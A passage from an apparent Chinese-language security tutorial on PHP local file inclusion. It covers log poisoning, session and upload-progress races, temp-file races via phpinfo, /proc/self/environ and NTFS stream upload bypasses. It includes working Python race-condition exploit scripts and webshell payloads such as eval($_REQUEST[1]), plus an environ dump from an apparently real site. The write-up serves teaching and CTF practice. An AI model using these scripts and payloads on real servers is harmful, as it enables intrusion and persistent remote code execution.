phpinfo();?&gt;</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%971.png" alt="此处输入图片的描述"></p><p>之后我们就会在access.log 中看到我们的请求</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%972.png" alt="此处输入图片的描述"></p><p>尝试包含</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%973.png" alt="此处输入图片的描述"></p><p>可以看到我们成功的包含了日志文件</p><p><strong>注意：</strong></p><p>(1)除了我们包含 access.log 以外，我们还可以制造错误，然后包含 error.log<br>(2)如果出现包含不成功的情况，很有可能就是被 open_base_dir() 限制了<br>(3)实战中最好在凌晨的时候进行包含，要不然日志太大包含会失败<br>(4)除了 apache 和 nginx 的日志 还有很多其他的日志我们能利用，比如说 ssh 的日志 </p><h4 id="2-SESSION"><a href="#2-SESSION" class="headerlink" title="2.SESSION"></a><strong>2.SESSION</strong></h4><h5 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a><strong>原理分析</strong></h5><p>使用了session来保存用户会话，php手册中是这样描述的：</p><blockquote><p>1.PHP 会将会话中的数据设置到 <code>$_SESSION </code>变量中。<br>2.<strong>当 PHP 停止的时候</strong>，它会自动读取 $_SESSION 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。<br>3.对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</p></blockquote><p>php的session文件的保存路径可以在phpinfo()的session.save_path看到，</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session%20%E5%AD%98%E6%94%BE%E4%BD%8D%E7%BD%AE.png" alt="此处输入图片的描述"></p><blockquote><p><strong>补充：</strong></p><p>常见的php-session存放位置：</p><pre><code class="hljs">/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID</code></pre></blockquote><p>我们来亲自做一个小实验吧</p><p>首先我们使用 php 中的创建 session 的函数写一段小代码</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?php//启动session的初始化session_start();//注册session变量，赋值为一个用户的名称$_SESSION[&quot;username&quot;]=&quot;K0rz3n&quot;;?&gt;</code></pre><p>然后访问这个页面后，我们去 phpinfo 中告诉我们的位置找一下这个文件</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session%E6%96%87%E4%BB%B6.png" alt="此处输入图片的描述"></p><p>再看一下我们的 cookie 中的 PHPSESSID</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPSESSID.png" alt="此处输入图片的描述"></p><p>是不是和文件名中的一部分完全一样？ 再次验证了session 文件的命名规则是 sess_[PHPSESSID]</p><p>session 里面的内容是什么呢</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session%20%E5%86%85%E5%AE%B9.png" alt="此处输入图片的描述"></p><p>我们清楚地看到，session 文件中的内容正是文档中所说的是一个序列化过的内容</p><h5 id="实战一：PhpMyadmin-4-8-1-后台-getshell"><a href="#实战一：PhpMyadmin-4-8-1-后台-getshell" class="headerlink" title="实战一：PhpMyadmin 4.8.1 后台 getshell"></a><strong>实战一：PhpMyadmin 4.8.1 后台 getshell</strong></h5><p>所以我们如果想包含 session 文件，要求还是比较的苛刻，我们必须要能控制 session 的输入，但是最近我发现了一个很好的实例 PhpMyadmin 4.8.1 后台 getshell ，其中有一种巧妙的利用方式就是利用包含我们访问 phpmyadmin 的 session 文件</p><p>我们只要在 phpmyadmin 中执行如下语句</p><pre><code class="hljs">select &quot;&lt;?php phpinfo();?&gt;&quot;;</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phpmyadmin%20%E5%8C%85%E5%90%ABsession1.png" alt="此处输入图片的描述"></p><p>然后我们去找那个 session 文件</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phpmyadmin%20%E5%8C%85%E5%90%ABsession2.png" alt="此处输入图片的描述"></p><p>哈哈，接下来就是我们文件包含漏洞大显申通的时候了</p><h5 id="实战二：利用-session-upload-progress-getshell"><a href="#实战二：利用-session-upload-progress-getshell" class="headerlink" title="实战二：利用 session.upload_progress getshell"></a><strong>实战二：利用 session.upload_progress getshell</strong></h5><p>在我们的利用面涉及到两个重要的选项，<strong>session_upload_progress.enable</strong> 和 <strong>session_upload_progress.cleanu</strong>p 而这两个选项 php 官方是默认开启的，并且强烈推荐我们开启</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Progress%20enable%20default.png" alt="此处输入图片的描述"></p><p>我们回归正题，先解释一下这个上传进度的概念</p><h6 id="1-先来了解一下什么是-session-upload-progress"><a href="#1-先来了解一下什么是-session-upload-progress" class="headerlink" title="1.先来了解一下什么是 session.upload_progress"></a><strong>1.先来了解一下什么是 session.upload_progress</strong></h6><p><strong>session.upload_progress 是PHP5.4的新特征</strong></p><p><strong>官方文档的介绍如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session%20upload1.png" alt="此处输入图片的描述"></p><blockquote><p>ps: 这个说的好像有一点问题，应该是与 session.upload_progress.name 的值连接在一起的值</p></blockquote><p>那么这两个参数在 phpinfo(); 中的究竟是什么样子呢？因为后面已一直用到，所以我们先来看一下</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session%20%E5%8F%82%E6%95%B0%E7%9A%84%E5%80%BC.png" alt="此处输入图片的描述"></p><h6 id="2-我们用实例代码解释一下上传进度"><a href="#2-我们用实例代码解释一下上传进度" class="headerlink" title="2.我们用实例代码解释一下上传进度"></a><strong>2.我们用实例代码解释一下上传进度</strong></h6><p><strong>POST 的表单</strong></p><p><strong>tt.php</strong></p><pre><code class="hljs">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;./upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&lt;?php echo ini_get(&#39;session.upload_progress.name&#39;);?&gt; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; value = &quot;&quot;/&gt; &lt;input type=&quot;file&quot; name=&quot;file2&quot; value = &quot;&quot;/&gt; &lt;input type=&quot;submit&quot; name = &quot;submit&quot; value = &quot;upload&quot;/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>我们看到，这个 POST 表单通过 ini_get(“session.upload_progress.name”) 在 hidden POST 了一个和 php.ini 中 session.upload_progress.name 名字一样的数据，值为123</p><p>如果我们能通过疯狂发包，使得这个 hidden 的 POST 数据能在文件传输没有完成的时候被服务器接收到，那么服务器就会在 session 临时文件中存储 这个文件的上传进度（当然是以序列化的形式显示的）</p><p>为了能清楚地展示这个 session ，我假设我们的 upload.php 中存在下面的语句,<code>$_SESSION</code> 的值就能输出来   </p><pre><code class="hljs">$key = ini_get(&quot;session.upload_progress.prefix&quot;) . $_POST[ini_get(&quot;session.upload_progress.name&quot;)];echo $_SESSION[$key];</code></pre><p>于是我们得到了类似这样的 <strong>$_SESSION 数据</strong></p><pre><code class="hljs">&lt;?php$_SESSION[&quot;upload_progress_123&quot;] = array( &quot;start_time&quot; =&gt; 1234567890,   // The request time &quot;content_length&quot; =&gt; 57343257, // POST content length &quot;bytes_processed&quot; =&gt; 453489,  // Amount of bytes received and processed &quot;done&quot; =&gt; false,              // true when the POST handler has finished, successfully or not &quot;files&quot; =&gt; array(  0 =&gt; array(   &quot;field_name&quot; =&gt; &quot;file1&quot;,       // Name of the &lt;input/&gt; field   // The following 3 elements equals those in $_FILES   &quot;name&quot; =&gt; &quot;foo.avi&quot;,   &quot;tmp_name&quot; =&gt; &quot;/tmp/phpxxxxxx&quot;,   &quot;error&quot; =&gt; 0,   &quot;done&quot; =&gt; true,                // True when the POST handler has finished handling this file   &quot;start_time&quot; =&gt; 1234567890,    // When this file has started to be processed   &quot;bytes_processed&quot; =&gt; 57343250, // Amount of bytes received and processed for this file  ),  // An other file, not finished uploading, in the same request  1 =&gt; array(   &quot;field_name&quot; =&gt; &quot;file2&quot;,   &quot;name&quot; =&gt; &quot;bar.avi&quot;,   &quot;tmp_name&quot; =&gt; NULL,   &quot;error&quot; =&gt; 0,   &quot;done&quot; =&gt; false,   &quot;start_time&quot; =&gt; 1234567899,   &quot;bytes_processed&quot; =&gt; 54554,  ), ));</code></pre><p>可以看到我们的 123 赫然出现在 session 的数组中，那么如果我们 POST 的值不是 123 而是 <code>&lt;?php file_put_contents(&quot;xx&quot;,&quot;&lt;?php eval(@$_POST[&#39;cmd&#39;]);?&gt;&quot;)?&gt;</code> 呢，是不是我们就能通过包含这个session 文件达到写shell 的目的了呢？</p><p>但是还存在一个问题，当 session.upload_progress.cleanup为 On 的时候，<code>$_SESSION</code> 中的这个上传进度信息会在读取完全部的 POST 数据后立刻删除（删除的是 session 文件中的上传进度的部分内容，而不是session ），于是乎这个时候就需要条件竞争</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session%20enable.png" alt="此处输入图片的描述"></p><p>我们从 PHPSESSID 中得到我们的 session 名以后，我们就一边疯狂请求 upload 页面 一边疯狂包含我们的 session 文件就好了</p><p><strong>这里给出一个 可用的 POC</strong> </p><pre><code class="hljs">#!coding:utf-8 import requestsimport timeimport threading host = &#39;http://localhost&#39;PHPSESSID = &#39;vrhtvjd4j1sd88onr92fm9t2gt&#39; def creatSession():    while True:        files = &#123;        &quot;submit&quot; : (&quot;tmp.gif&quot;, open(&quot;E:/fuck.gif&quot;, &quot;rb&quot;))        &#125;        data = &#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; : &quot;&lt;?php echo &#39;K0rz3n&#39;;file_put_contents(&#39;F:/muma.php&#39;,&#39;&lt;?php phpinfo();?&gt;&#39;);?&gt;&quot; &#125;        headers = &#123;&#39;Cookie&#39;:&#39;PHPSESSID=&#39; + PHPSESSID&#125;        r = requests.post(host+&#39;/index.php&#39;,files = files,headers = headers,data=data)fileName = &quot;E:/phpstudy/PHPTutorial/tmp/tmp/sess_&quot;+PHPSESSID if __name__ == &#39;__main__&#39;:        url = &quot;&#123;&#125;/qweasdzxc.php?rf=&#123;&#125;&quot;.format(host,fileName)    headers = &#123;&#39;Cookie&#39;:&#39;PHPSESSID=&#39; + PHPSESSID&#125;    t = threading.Thread(target=creatSession,args=())    t.setDaemon(True)    t.start()    while True:        res = requests.get(url,headers=headers)        if &quot;K0rz3n&quot; in res.content:            print res.content            print(&quot;[*] Get shell success.&quot;)            break        else:            print(&quot;[-] retry.&quot;)</code></pre><p>对于这个 POC 我在本地也做了测试，下面是我的测试过程</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session%20getshell.gif" alt="此处输入图片的描述"></p><p>其中，我为了演示的效果还把 session 文件在那一瞬间的内容给大家显示出来了，就是下面这段内容</p><pre><code class="hljs">upload_progress_K0rz3n|a:5:&#123;s:10:&quot;start_time&quot;;i:1540314711;s:14:&quot;content_length&quot;;i:764161;s:15:&quot;bytes_processed&quot;;i:5302;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:6:&quot;submit&quot;;s:4:&quot;name&quot;;s:7:&quot;tmp.gif&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1540314711;s:15:&quot;bytes_processed&quot;;i:5302;&#125;&#125;&#125;</code></pre><blockquote><p><strong>注意：这里有一个误区</strong></p><p>发现，如果我们的 POST 请求中带着 session.upload_progress.name 的值，不管服务端PHP有没有<br>session_start() 的调用， 只要我们在请求头中填上 PHPSESSID(符合格式，随便你怎么写),服务器就会根据我们这个<br>PHPSESSID 在session 文件的默认存放位置生成一个 session 文件，这个方法也是 hitcon 2018 Orange 提醒我们的 </p></blockquote><h6 id="3-实际的案例"><a href="#3-实际的案例" class="headerlink" title="3.实际的案例"></a><strong>3.实际的案例</strong></h6><p><strong>1.N1CTF 2018 easy_php</strong></p><p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/">http://skysec.top/2018/04/04/amazing-phpinfo/</a><br>这道题的复盘在<a href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a></p><p><strong>2.SCTF 2018 BabySyc - Simple PHP</strong></p><p><a href="https://www.jianshu.com/p/051a87f45222?utm_campaign=maleskine&utm_content=note&utm_medium=reader_share&utm_source=weixin">https://www.jianshu.com/p/051a87f45222?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=weixin</a></p><p><strong>3.hitcon 2018 one line php challenge</strong></p><p><a href="http://wonderkun.cc/index.html/?p=718">http://wonderkun.cc/index.html/?p=718</a><br><a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge">https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge</a></p><h4 id="3-数据库文件"><a href="#3-数据库文件" class="headerlink" title="3.数据库文件"></a><strong>3.数据库文件</strong></h4><p>我们知道，我们的数据库就是从纯文件的管理方式中进化而来，但是，计算机中存储的依然是文件，那么我们能不能在数据库中动动手脚，向数据库中的某个文件注入我们的恶意代码然后本地文件包含呢？当然可以，在 phpmyadmin 4.8.1 后台 getshell 中漏洞的发现者就是利用了这样一种技术成功包含了数据库的文件</p><p>如果我们有创建表的权限，我们完全可以将表的某个字段写成一个一句话，然后我们找到这个表对应的文件包含之</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%86%99%20shell.png" alt="此处输入图片的描述"></p><p>我们知道数据库的一起都是以文件的形式存在的，我们来找一下这个文件</p><p><strong>如图所示:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99%E5%85%A5shell.png" alt="此处输入图片的描述"></p><h4 id="4-临时文件"><a href="#4-临时文件" class="headerlink" title="4.临时文件"></a><strong>4.临时文件</strong></h4><p>向服务器上<strong>任意php文件</strong>以 <strong>form-data</strong> 方式提交请求上传数据时，会生成临时文件,通过<strong>phpinfo</strong>来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要条件竞争包含临时文件，然后如果临时文件的内容是一个向 web 目录写一句话，我们就能成功执行这段代码，并写 shell 到 web 目录最终拿到webshell(临时文件的文件名和位置需要在phpinfo 页面中查看)</p><p>下图为 PHP 处理临时文件的整个过程：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B.png" alt="此处输入图片的描述"></p><p>比如说我 post 这样一个表单</p><pre><code class="hljs">&lt;!doctype html&gt;  &lt;html&gt;  &lt;body&gt;      &lt;form action=&quot;http://localhost/testphpinfo/phpinfo.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;      &lt;input type=&quot;file&quot; name=&quot;file&quot;/&gt;&lt;br/&gt;      &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;  &lt;/form&gt;  &lt;/body&gt;  &lt;/html&gt;</code></pre><p>那么在 phpinfo 中就能发现下面的一项</p><pre><code class="hljs">$_FILES[&quot;file&quot;]Array(    [name] =&gt; test.txt    [type] =&gt; application/octet-stream    [tmp_name] =&gt; H:\wamp64\tmp\php1E81.tmp    [error] =&gt; 0    [size] =&gt; 201)</code></pre><p><strong>下面引用 p总 在 vulhub 中的详细介绍：</strong></p><p><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p><blockquote><p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是&#x2F;tmp&#x2F;php[6个随机字符]），文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p><p>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。</p><p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p><p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p><p>这个时候就需要用到条件竞争，具体流程如下：</p><p>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据<br>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大<br>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接<br>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包<br>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除<br>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p></blockquote><p>下面是p 总的利用脚本，其中的有些地方我给出了简单的注释，方便大家理解</p><pre><code class="hljs">#!/usr/bin/python import sysimport threadingimport socketdef setup(host, port):                                   #所有的请求的内容    TAG=&quot;Security Test&quot;    PAYLOAD=&quot;&quot;&quot;%s\r&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;\r&quot;&quot;&quot; % TAG    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD        padding=&quot;A&quot; * 5000        REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)    #modify this to suit the LFI script       LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\r\r\r&quot;&quot;&quot;    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)                        #向phpinfo 发起请求    d = &quot;&quot;    while len(d) &lt; offset:        d += s.recv(offset)    try:        i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)      #从偏移量中找关键字        fn = d[i+17:i+31]                             #得到临时文件名（这个切片和系统有关，我在windows 下测试使用的是 d[i+17:i+39]）            except ValueError:        return None    s2.send(lfireq % (fn, host))       #发起LFI请求    d = s2.recv(4096)    s.close()    s2.close()    if d.find(tag) != -1:                     #找页面返回中我们之前设下的标志 TAG        return fncounter=0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter &gt;= self.maxattempts:                    return                counter+=1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                                if x:                    print &quot;\nGot it! Shell created in /tmp/g&quot;                    self.event.set()                                except socket.error:                return    def getOffset(host, port, phpinforeq):    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)        d = &quot;&quot;    while True:        i = s.recv(4096)                      #循环接受4096字节直到接收完毕        d+=i                if i == &quot;&quot;:            break        # detect the final chunk        if i.endswith(&quot;0\r\n\r\n&quot;):            break    s.close()    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)    if i == -1:        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)        print &quot;found %s at %i&quot; % (d[i:i+10],i)   #进行试探得到文件名的偏移量    # padded up a bit    return i+256                             #为提高准确性扩大了范围           def main():        print &quot;LFI With PHPInfo()&quot;    print &quot;-=&quot; * 30    if len(sys.argv) &lt; 2:        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)        sys.exit(1)    port=80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)        sys.exit(1)        poolsz=10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)        sys.exit(1)    print &quot;Getting initial offset...&quot;,      reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print &quot;Spawning worker pool (%d)...&quot; % poolsz    sys.stdout.flush()    tp = []    for i in range(0,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))                sys.stdout.flush()                if counter &gt;= maxattempts:                    break        print        if e.is_set():            print &quot;Woot!  \m/&quot;        else:            print &quot;:(&quot;    except KeyboardInterrupt:        print &quot;\nTelling threads to shutdown...&quot;        e.set()        print &quot;Shuttin&#39; down...&quot;    for t in tp:        t.join()if __name__==&quot;__main__&quot;:    main()</code></pre><p>这样的利用方式实际上在 2001 年国外的安全研究人员就发现了，只不过因为条件苛刻很少用到</p><p>下面是我用这个脚本测试的例子</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phpinfo%20tmp%20getshell.gif" alt="此处输入图片的描述"></p><p><strong>下面是两个实际的例子</strong></p><p><strong>1.NU1L CTF 2018</strong> </p><p><a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a></p><p><strong>2.链家旗下自如某站一个有意思的文件包含到简单内网渗透</strong></p><p><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0134185.html">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0134185.html</a></p><blockquote><p><strong>补充：思考关于临时文件的含义</strong></p><p>这个包含临时文件的思想不要仅仅局限于 php<br>自己产生的临时文件，其他服务也可能会有可控的临时文件，这个时候我们也可以选择包含这些临时文件，就比如我之前<a href="http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/">这篇文章</a>说过的 上传的 jar ，我们一样也可以包含，于是我在 LCTF 2018 出了这一道题，具体细节可以看我的<a href="http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">这篇文章</a></p></blockquote><h4 id="5-proc-self-environ"><a href="#5-proc-self-environ" class="headerlink" title="5.&#x2F;proc&#x2F;self&#x2F;environ"></a><strong>5.&#x2F;proc&#x2F;self&#x2F;environ</strong></h4><p>通过本地文件包含漏洞,查看是否可以包含&#x2F;proc&#x2F;self&#x2F;environ文件。然后<strong>向User-Agent头中注入</strong>PHP代码有可能会攻击成功。如果代码被成功注入到User-Agent头中，本地文件包含漏洞会利用并执行&#x2F;proc&#x2F;self&#x2F;environ，这样就能得到你的shell</p><p>这里我说一下这个 self ，这个 self 不要以为就是 self 文件夹，实际上子目录&#x2F;proc&#x2F;self本身就是当前运行进程 PID，你会发现你每次请求得到的 self 都是不同的</p><p><strong>如图一：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/self1.png" alt="此处输入图片的描述"></p><p><strong>如图二：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/self2.png" alt="此处输入图片的描述"></p><p>从 Linux 内部去看的话，就是一堆数字命名的文件夹，还能看到有些是属于 root 的有些是属于 apache 的</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/self3.png" alt="此处输入图片的描述"></p><p>从上面的部分图你也能看到另一个问题，就是这个文件的读取需要一定的权限，至少 php 默认情况下是没法读取的，我们看一下这个文件的读取权限</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/environ%20%E6%9D%83%E9%99%90.png" alt="此处输入图片的描述"></p><p>我还能说什么，只有文件所有者可读，且仅仅是可读，这就不是很好办了，就拿网上的例子说一下吧，这里仅仅提供一个思路，遇到能包含的情况随机应变</p><p>如果能成功包含，那么你可能会看到下面这样的结果：</p><pre><code class="hljs">DOCUMENT_ROOT=/home/dprdicom/public_html/smscenterGATEWAY_INTERFACE=CGI/1.1HTTP_ACCEPT=text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8HTTP_ACCEPT_ENCODING=gzip,deflateHTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5HTTP_CONNECTION=keep-aliveHTTP_HOST=smscenter.dprdbekasikota.go.idHTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:27.0) Gecko/20100101Firefox/27.0PATH=/bin:/usr/binPHPRC=/usr/local/lib/QUERY_STRING=page=../../../../proc/self/environREDIRECT_STATUS=200REMOTE_ADDR=182.68.251.152REMOTE_PORT=21007REQUEST_METHOD=GETREQUEST_URI=/?page=../../../../proc/self/environSCRIPT_FILENAME=/home/dprdicom/public_html/smscenter/index.phpSCRIPT_NAME=/index.phpSERVER_ADDR=103.28.12.130SERVER_ADMIN=_NAME=smscenter.dprdbekasikota.go.idSERVER_PORT=80SERVER_PROTOCOL=HTTP/1.1SERVER_</code></pre><p><strong>注意这一段：</strong></p><pre><code class="hljs">HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:27.0) Gecko/20100101 Firefox/27.0</code></pre><p>找到了可控目标接下来就是在 UA 中注入我们的恶意代码，</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/UA%E6%B3%A8%E5%85%A5.png" alt="此处输入图片的描述"></p><p>然后就包含啦</p><h4 id="4-包含上传的文件"><a href="#4-包含上传的文件" class="headerlink" title="4.包含上传的文件"></a><strong>4.包含上传的文件</strong></h4><p>有上传点是最好的了，上传的内容可以是任意的后缀名，不影响最终的结果。</p><p>这里有一些使用 NTFS ADS 文件流绕过检测的方法，值得大家参考</p><p>在测试中我们发现，如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。假设我们需要上传的文件内容为：<?php phpinfo();?>下面是上传是会出现的现象：</p><pre><code class="hljs">上传 Test.php:a.jpg     生成Test.php  文件内容为空上传 Test.php::$DATA  生成test.php  文件内容为&lt;?php phpinfo();?&gt;上传 Test.php::$INDEX_ALLOCATION  生成test.php文件夹上传 Test.php::$DATA\0.jpg  生成0.jpg  文件内容为&lt;?php phpinfo();?&gt;上传 Test.php::$DATA\aaa.jpg  生成aaa.jpg  文件内容为&lt;?php phpinfo();?&gt;PS: 上传test.php:a.jpg的时候其实是在服务器上正常生成了一个数据流文件，可以通过notepad test.php:a.jpg查看内容，而test.php为空也是正常的。</code></pre><h4 id="5-配置文件过滤不当"><a href="#5-配置文件过滤不当" class="headerlink" title="5.配置文件过滤不当"></a><strong>5.配置文件过滤不当</strong></h4><p>有些时候配置信息是直接写在服务器端的文件中的，如果我们能够绕过这就是一个 webshell</p><p>这个也只是一个思路，只要是用户可控的内容往服务器上写，就存在包含的可能</p><h4 id="6-php-伪协议包含"><a href="#6-php-伪协议包含" class="headerlink" title="6.php 伪协议包含"></a><strong>6.php 伪协议包含</strong></h4><p>这个就可以说是利用 php 